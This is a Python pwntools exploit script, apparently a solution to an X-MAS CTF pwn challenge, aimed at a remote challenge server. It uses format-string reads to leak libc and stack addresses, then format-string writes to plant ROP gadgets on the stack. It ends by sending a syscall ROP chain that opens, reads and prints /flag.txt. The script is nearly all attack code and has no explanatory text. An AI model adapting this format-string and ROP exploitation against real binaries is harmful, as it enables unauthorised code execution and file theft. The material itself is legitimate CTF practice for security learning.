from pwn import *
from libformatstr import FormatStr

# context.log_level = 'debug'
p = remote('challs.xmas.htsp.ro', 12003)
# p = process('./main')
libc = ELF('/home/inertfluid/libc-database/db/libc6_2.27-3ubuntu1_amd64.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
# gdb.attach(p, '''b *0x555555554bad
# b *0x55555555498f	''')

pop_rdi = 0x000000000002155f
pop_rsi = 0x0000000000023e6a
pop_rdx = 0x0000000000001b96
pop_rax = 0x00000000000439c8
syscall = 0x00000000000d2975

p.recvuntil('?')
p.sendline('lol')
p.recvuntil('Santa')
p.sendline('%41$p')
p.recvuntil(': ')
libc_start_main = int(p.recvuntil('\n')[:-1], 16)
libc_base = libc_start_main - (libc.symbols['__libc_start_main'] + 231)

p.sendline('%38$p')
p.recvuntil(': ')
stack_leak = int(p.recvuntil('\n')[:-1], 16) 

jump = hex(libc_base+pop_rdi)[2:]
f=FormatStr(isx64=1)
f[stack_leak - 0xd8] = int('0x' + jump[-4:], 16)
p.sendline(f.payload(6, start_len = 0))
p.recvuntil('\x7f')
f=FormatStr(isx64=1)
f[stack_leak - 0xd8+2] = int('0x' + jump[-8:-4], 16)
p.sendline(f.payload(6, start_len = 0))
p.recvuntil('\x7f')
f[stack_leak - 0xd8+4] = int('0x' + jump[:4], 16)
p.sendline(f.payload(6, start_len = 0))
p.recvuntil('\x7f')

p.sendline('%41$p')
p.recvuntil(': ')
if libc_base + pop_rdi == int(p.recvuntil('\n')[:-1], 16):
	print 'Done 1'

jump = hex(stack_leak - 0xc0)[2:]
f=FormatStr(isx64=1)
f[stack_leak - 0xd0] = int('0x' + jump[-4:], 16)
p.sendline(f.payload(6, start_len = 0))
p.recvuntil('\x7f')
f[stack_leak - 0xd0+2] = int('0x' + jump[-8:-4], 16)
p.sendline(f.payload(6, start_len = 0))
p.recvuntil('\x7f')
f[stack_leak - 0xd0+4] = int('0x' + jump[:4], 16)
p.sendline(f.payload(6, start_len = 0))
p.recvuntil('\x7f')

p.sendline('%42$p')
p.recvuntil(': ')
if stack_leak - 0xc0 == int(p.recvuntil('\n')[:-1], 16):
	print 'Done 2'

jump = hex(libc_base + libc.symbols['gets'])[2:]
f=FormatStr(isx64=1)
f[stack_leak - 0xc8] = int('0x' + jump[-4:], 16)
p.sendline(f.payload(6, start_len = 0))
p.recvuntil('\x7f')
f[stack_leak - 0xc8+2] = int('0x' + jump[-8:-4], 16)
p.sendline(f.payload(6, start_len = 0))
p.recvuntil('\x7f')
f[stack_leak - 0xc8+4] = int('0x' + jump[:4], 16)
p.sendline(f.payload(6, start_len = 0))
p.recvuntil('\x7f')

p.sendline('%43$p')
p.recvuntil(': ')
if libc_base + libc.symbols['gets'] == int(p.recvuntil('\n')[:-1], 16):
	print 'Done 3'

p.sendline('end of letter')

p.recvuntil('Bye, bye, see you next year!')


some_address = stack_leak - 0xc0 + 27*0x8
some_address_2 = some_address + 0x18
some_address_3 = some_address_2 + 0x8

exploit = ''
exploit += p64(libc_base + pop_rax)
exploit += p64(0x2)
exploit += p64(libc_base + pop_rdi)
exploit += p64(some_address)
exploit += p64(libc_base + pop_rsi)
exploit += p64(0x0)
exploit += p64(libc_base + pop_rdx)
exploit += p64(0x0)
exploit += p64(libc_base + syscall)

exploit += p64(libc_base + pop_rax)
exploit += p64(0x0)
exploit += p64(libc_base + pop_rdi)
exploit += p64(0x3)
exploit += p64(libc_base + pop_rsi)
exploit += p64(some_address_3)
exploit += p64(libc_base + pop_rdx)
exploit += p64(0x100)
exploit += p64(libc_base + syscall)

exploit += p64(libc_base + pop_rax)
exploit += p64(0x1)
exploit += p64(libc_base + pop_rdi)
exploit += p64(0x1)
exploit += p64(libc_base + pop_rsi)
exploit += p64(some_address_3)
exploit += p64(libc_base + pop_rdx)
exploit += p64(0x100)
exploit += p64(libc_base + syscall)

loc = '/flag.txt'

exploit += loc+'\x00'*(0x18-len(loc))
exploit += p64(libc_base + pop_rax)
exploit += '''X-MAS{lol_this_is_your_flag}'''
p.sendline(exploit)
print p.recvuntil('}')
